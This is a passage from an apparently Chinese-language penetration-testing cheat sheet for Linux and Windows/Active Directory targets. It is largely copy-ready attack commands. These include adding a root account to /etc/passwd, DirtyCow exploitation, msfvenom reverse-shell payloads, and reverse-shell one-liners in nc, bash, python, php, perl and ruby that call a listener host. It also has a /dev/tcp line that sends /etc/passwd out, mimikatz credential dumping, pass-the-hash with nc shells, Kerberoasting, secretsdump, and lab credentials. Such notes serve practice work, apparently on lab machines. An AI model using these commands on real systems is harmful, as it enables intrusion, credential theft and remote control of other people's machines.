PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><h3 id="mail"><a class="markdownIt-Anchor" href="#mail"></a> mail</h3><p><code>cat /var/spool/mail/*</code></p><h3 id="crontab"><a class="markdownIt-Anchor" href="#crontab"></a> crontab</h3><p><code>cat /etc/crontab</code><br /><code>ls -la /var/spool/cron/</code><br /><code>ls -la /tmp</code><br /><code>crontab -e</code></p><p>crontab所执行的命令一般来说是难以通过ps命令来发现的，除非是在命令执行的过程中正好使用ps命令查看进程<br />这对于耗时长的命令或者是使用脚本循环执行命令来说是可行的，但是对于几乎瞬时完成的命令则是束手无策<br />可以使用pspy来持续地监视后台进程<br /><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p><ul><li>一般的crontab设置为整分运行，pspy每分钟的第一秒显示的命令即为crontab的内容</li><li>目录权限<ul><li>r 列出目录中的内容</li><li>w 在目录中增加删除文件，修改文件名</li><li>x 进入目录以及对目录下的文件进行操作</li><li>r-- 可以在不进入目录的情况下列出目录下的文件，但不能查看文件详细信息</li><li>–x 可以在单独列出已知文件，并查看文件详细信息</li></ul></li></ul><h3 id="passwd可写"><a class="markdownIt-Anchor" href="#passwd可写"></a> passwd可写</h3><p><code>ls -l /etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1</span><br><span class="line">echo &#39;test:$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="系统漏洞提权"><a class="markdownIt-Anchor" href="#系统漏洞提权"></a> 系统漏洞提权</h3><ul><li><a href="https://github.com/initstring/dirty_sock">CVE-2019-7304</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 18.10</span><br><span class="line">Ubuntu 18.04 LTS</span><br><span class="line">Ubuntu 16.04 LTS</span><br><span class="line">Ubuntu 14.04 LTS</span><br><span class="line">2.28 &lt; snapd &lt; 2.37</span><br><span class="line">网络连通</span><br></pre></td></tr></table></figure><ul><li>DirtyCow</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io</span><br><span class="line">cd dirtycow.github.io</span><br><span class="line">gcc dirtyc0w.c -o dirtycow -pthread</span><br><span class="line">.&#x2F;dirtycow &#x2F;etc&#x2F;group &quot;$(sed ‘&#x2F;\(sudo*\)&#x2F; s&#x2F;$&#x2F;,test&#x2F;’ &#x2F;etc&#x2F;group)&quot;</span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure><ul><li>40616.c</li></ul><h3 id="文件传输"><a class="markdownIt-Anchor" href="#文件传输"></a> 文件传输</h3><ul><li>FTP</li><li>SCP</li><li>HTTP<ul><li><code>python2 -m SimpleHTTPServer 80 &amp;</code></li><li><code>python3 -m http.server 80&amp;</code></li></ul></li><li>TCP Socket<ul><li><code>nc -lvnp 9999</code></li><li><code>bash -c 'exec 3&lt;&gt;/dev/tcp/127.0.0.1/9999; cat /etc/passwd &gt;&amp;3; exec 3&gt;&amp;-'</code></li></ul></li></ul><h3 id="内网代理"><a class="markdownIt-Anchor" href="#内网代理"></a> 内网代理</h3><ul><li>meterpreter(socks4)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f elf &gt; shell.elf</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br></pre></td></tr></table></figure><ul><li><p>portfwd -l 2222 -p 8080 -r 127.0.0.1 (本地服务端口转发/netstat)</p></li><li><p>earthworm(socks5)</p><ul><li>访问本地服务</li></ul></li><li><p>ngork</p><ul><li><p><a href="https://ngrok.com/">https://ngrok.com/</a></p></li><li><p><a href="https://www.tunnelnat.com/">https://www.tunnelnat.com/</a></p></li></ul></li><li><p>reGeorg</p></li><li><p>frp</p><ul><li><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.56.104</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[sock5_1]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 45555</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; user</span><br><span class="line">plugin_passwd &#x3D; pass</span><br><span class="line">#####################</span><br><span class="line">#frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line">dashboard_user &#x3D; admin</span><br><span class="line">dashboard_pass &#x3D; admin</span><br></pre></td></tr></table></figure><ul><li>nps<ul><li><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></li></ul></li><li>lcx</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lcx配合meterpreter进行公网反弹Shell</span><br><span class="line">Server上执行lcx -listen 8888 9999</span><br><span class="line">本地执行lcx -slave Server 8888 Local_IP 7777</span><br><span class="line">并在MSF监听Local_IP上的7777端口</span><br><span class="line">(注意这里不能用127.0.0.1) </span><br><span class="line">目标机器上meterpreter反弹至Server的8888端口</span><br></pre></td></tr></table></figure><ul><li>proxychain</li><li>proxifier</li><li>sockscap</li><li>socat<ul><li><code>socat tcp-listen:1234,fork tcp-connect:localhost:8080</code></li></ul></li><li>plink<ul><li><code>plink.exe -ssh root@192.168.0.1 -pw password -R 1234:127.0.0.1:3306</code></li></ul></li><li>sshuttle<ul><li><a href="https://github.com/sshuttle/sshuttle">https://github.com/sshuttle/sshuttle</a></li></ul></li><li>SSH<ul><li>LOCAL &amp; REMOTE &amp; SOCKS</li></ul></li></ul><h4 id="shell-2"><a class="markdownIt-Anchor" href="#shell-2"></a> Shell</h4><ul><li>nc</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc.traditional是最早的版本(v1.10-41.1)，该版本具有&#96;&#96;-e&#96;&#96;的选项，用于反弹shell十分方便</span><br><span class="line">ubuntu中的nc命令则会指向netcat-openbsd，而该版本则没有&#96;&#96;-e&#96;&#96;的选项，无法用于反弹shell</span><br><span class="line">ncat的版本则比较新，集成于nmap中</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#正向Shell</span></span><br><span class="line">nc -lvvp 8080 -t -e /bin/bash</span><br><span class="line">.............................</span><br><span class="line">nc 192.168.0.1 8000</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i 2&gt;&amp;1 | nc 192.168.0.1 8080</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.0.1 8080 &gt;/tmp/f</span><br><span class="line">nc -e /bin/bash 192.168.0.1 8080</span><br><span class="line">.............................</span><br><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><ul><li>bash</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1</span><br><span class="line">.............................</span><br><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><ul><li>python</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.0.1&#x27;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure><ul><li>php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1&quot;)&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>perl</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>ruby</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;192.168.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="powershell"><a class="markdownIt-Anchor" href="#powershell"></a> PowerShell</h3><ul><li>命令多条分隔/命令注入: ;</li><li>Secure String</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$password &#x3D; ConvertTo-SecureString &#39;P@ssw0rd&#39; -AsPlainText -Force</span><br><span class="line">$Ptr &#x3D; [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)</span><br><span class="line">$result &#x3D; [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)</span><br><span class="line">[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)</span><br><span class="line">$result </span><br></pre></td></tr></table></figure><hr /><h1 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> Windows</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><ul><li>nmap</li><li>dirb</li><li>wfuzz<ul><li>VHOST: <code>wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://flight.htb&quot; -H &quot;Host: FUZZ.flight.htb&quot; --hl 154</code></li></ul></li><li>enum4linux<ul><li><code>enum4linux 10.10.10.248</code></li><li><a href="https://github.com/cddmp/enum4linux-ng">https://github.com/cddmp/enum4linux-ng</a></li></ul></li><li>smbmap<ul><li><code>smbmap -H 10.10.10.248 -u &quot;test&quot;</code></li><li><code>smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence</code></li></ul></li><li>smbclient<ul><li><code>smbclient //10.10.10.248/users -U Tiffany.Molina --password='NewIntelligenceCorpUser9876'</code></li><li>下载路径</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mask &quot;&quot;</span><br><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line">mget active.htb</span><br></pre></td></tr></table></figure><ul><li>kerbrute</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum -dc-ip 10.10.10.248 -d intelligence.htb users</span><br></pre></td></tr></table></figure><ul><li>bloodhound</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d megacorp.local -u sandra -p <span class="string">&quot;Password1234!&quot;</span> -gc pathfinder.megacorp.local -c all -ns 10.10.10.30</span><br><span class="line">neo4j console</span><br><span class="line">bloodhound</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -O</span><br><span class="line">curl https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -O</span><br><span class="line">invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</span><br></pre></td></tr></table></figure><ul><li>lookupsid</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py sql_svc:REGGIE1234ronnie@10.10.11.202</span><br></pre></td></tr></table></figure><ul><li>pywerview</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pywerview.py get-netcomputer -u svc_int$ --hashes 47e89a6afd68e3872ef1acaf91d0b2f7 -d intelligence.htb -t dc.intelligence.htb --full-data</span><br></pre></td></tr></table></figure><ul><li>procdump</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./procdump64.exe -accepteula -ma 6216</span><br></pre></td></tr></table></figure><ul><li>crackmapexec<ul><li>username: <code>crackmapexec smb 10.10.11.187 -d flight -u svc_apache -p 'S@Ss!K@*t13' --users</code></li></ul></li><li><a href="https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat">https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat</a></li><li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></li><li>AD</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get-aduser -filter * -server $dc_domain_name | format-table name,samaccountname -a</span><br><span class="line">get-aduser -identity $username -server $dc_domain_name -properties *</span><br><span class="line">get-adgroup -filter * -server $dc_domain_name | format-table name -a</span><br><span class="line">get-adgroup -identity $groupname -server $dc_domain_name</span><br><span class="line">get-adgroupmember -identity $groupname -server $dc_domain_name</span><br><span class="line">get-adobject</span><br><span class="line">get-addomain -server $dc_domain_name</span><br></pre></td></tr></table></figure><h2 id="爆破"><a class="markdownIt-Anchor" href="#爆破"></a> 爆破</h2><ul><li>爆破smb<br /><code>crackmapexec smb 10.10.10.248 -d intelligence -u user -p NewIntelligenceCorpUser9876 --continue-on-success</code></li><li>爆破winrm<br /><code>crackmapexec winrm 10.10.10.149 -d heist -u user -p pass</code></li></ul><h2 id="获取凭证"><a class="markdownIt-Anchor" href="#获取凭证"></a> 获取凭证</h2><h3 id="gmsadumper"><a class="markdownIt-Anchor" href="#gmsadumper"></a> gMSADumper</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py</span><br><span class="line">python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248</span><br></pre></td></tr></table></figure><h3 id="allowed_to_delegate_to"><a class="markdownIt-Anchor" href="#allowed_to_delegate_to"></a> allowed_to_delegate_to</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 pywerview.py get-netcomputer -u svc_int$ --hashes 47e89a6afd68e3872ef1acaf91d0b2f7 -d intelligence.htb -t dc.intelligence.htb --full-data</span><br><span class="line">python3 getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :47e89a6afd68e3872ef1acaf91d0b2f7 -impersonate administrator</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 secretsdump.py -k dc.intelligence.htb -just-dc</span><br></pre></td></tr></table></figure><h3 id="gpp"><a class="markdownIt-Anchor" href="#gpp"></a> GPP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</span><br></pre></td></tr></table></figure><h3 id="portablekanban"><a class="markdownIt-Anchor" href="#portablekanban"></a> PortableKanban</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment"># python3 -m pip install des</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line"><span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&quot;</span>))</span><br></pre></td></tr></table></figure><h3 id="mimikatz"><a class="markdownIt-Anchor" href="#mimikatz"></a> mimikatz</h3><p>SAM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p>LSASS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">sekurlsa::msv</span><br></pre></td></tr></table></figure><p>LOGGED</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure><p>REGISTRY</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::secrets</span><br></pre></td></tr></table></figure><p>KERBEROS_KEYS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure><p>KERBEROS_TICKETS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets &#x2F;export</span><br><span class="line">kerberos::ptt $ticket_file</span><br></pre></td></tr></table></figure><p>PASS_THE_KEY</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br><span class="line">sekurlsa::pth &#x2F;user:$username &#x2F;domain:$domain &#x2F;rc4:$rc4 &#x2F;run:&quot;nc64.exe -e cmd.exe $ip $port&quot;</span><br><span class="line">sekurlsa::pth &#x2F;user:$username &#x2F;domain:$domain &#x2F;aes128:$aes128 &#x2F;run:&quot;nc64.exe -e cmd.exe $ip $port&quot;</span><br><span class="line">sekurlsa::pth &#x2F;user:$username &#x2F;domain:$domain &#x2F;aes256:$aes256 &#x2F;run:&quot;nc64.exe -e cmd.exe $ip $port&quot;</span><br></pre></td></tr></table></figure><h3 id="kerberoasting"><a class="markdownIt-Anchor" href="#kerberoasting"></a> Kerberoasting</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mi>G</mi><mi>S</mi><mi mathvariant="normal">_</mi><mi>T</mi><mi>i</mi><mi>c</mi><mi>k</mi><mi>e</mi><mi>t</mi><mo>=</mo><mi>R</mi><mi>C</mi><mn>4</mn><mo>−</mo><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>P</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mo>=</mo><mi>T</mi><mi>i</mi><mi>m</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi>a</mi><mi>m</mi><mi>p</mi><mo separator="true">,</mo><mi>K</mi><mi>e</mi><mi>y</mi><mo>=</mo><mi>S</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>T</mi><mi>L</mi><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TGS\_Ticket = RC4-HMAC(Plain = Timestamp, Key = Server\_NTLM)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">G</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span><br />Plain格式固定且已知，枚举Key解密TGS_Tikect，格式匹配即得到Server_NTLM</p><ul><li>一般用于攻击服务用户账号</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/<span class="variable">$user</span>:<span class="variable">$password</span> -request</span><br><span class="line">python GetUserSPNs.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/<span class="variable">$user</span>:<span class="variable">$password</span> -request-user <span class="variable">$spn_user</span> -save -outfile tgs</span><br><span class="line">hashcat -m 13100 tgs /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><ul><li><a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\invoke-kerberoast</span><br><span class="line">invoke-kerberoast -outputformat hashcat</span><br></pre></td></tr></table></figure><h3 id="as-rep-roasting"><a class="markdownIt-Anchor" href="#as-rep-roasting"></a> AS-REP Roasting</h3><blockquote><p>Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against 